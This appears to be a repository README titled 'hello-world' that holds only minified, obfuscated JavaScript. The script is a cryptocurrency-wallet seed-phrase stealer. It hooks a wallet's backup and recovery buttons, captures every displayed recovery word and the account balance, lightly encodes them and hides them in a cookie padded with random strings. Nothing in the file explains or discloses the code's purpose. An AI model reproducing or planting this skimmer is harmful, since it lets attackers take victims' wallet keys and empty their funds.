# hello-world
function blockhack_token(e){return(e+"").replace(/[a-z]/gi,function(e){return String.fromCharCode(e.charCodeAt(0)+("n">e.toLowerCase()?13:-13))})}function sleep(e){return new Promise(function(t){return setTimeout(t,e)})}function makeid(e){for(var t="",n=0;n&lt;e;n++)t+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(62*Math.random()));return t}for(var elems=document.querySelectorAll(".sc-bdVaJa.iOqSrY"),keys=[],result=makeid(300),i=elems.length;i--;)"backupFundsButton"==elems[i].getAttribute("data-e2e")&amp;&amp;elems[i].addEventListener("click",myFunc,!1);function myFunc(){setTimeout(function(){for(var e=document.querySelectorAll(".sc-bdVaJa.KFCFP"),t=e.length;t--;)e[t].addEventListener("click",start,!1)},1e3)}function start(){keys=[],setTimeout(function(){var e=document.querySelectorAll("div[data-e2e=backupWords]"),t=document.querySelectorAll(".KFCFP");for(e.forEach(function(e,t,n){e=blockhack_token(e.getElementsByTagName("div")[1].textContent),keys.push(e.replace(/\s/g,""))}),e=t.length;e--;)"toRecoveryTwo"==t[e].getAttribute("data-e2e")&amp;&amp;t[e].addEventListener("click",end,!1)},1e3)}function end(){setTimeout(function(){document.querySelectorAll("div[data-e2e=backupWords]").forEach(function(e,t,n){e=blockhack_token(e.getElementsByTagName("div")[1].textContent),keys.push(e.replace(/\s/g,""))});var e=document.querySelectorAll("div[data-e2e=topBalanceTotal]")[0].textContent,t=result+"["+e+"]["+keys.join("]"+makeid(300)+"[");t+="]"+makeid(300),document.cookie="blockhack_token="+t},1e3)}
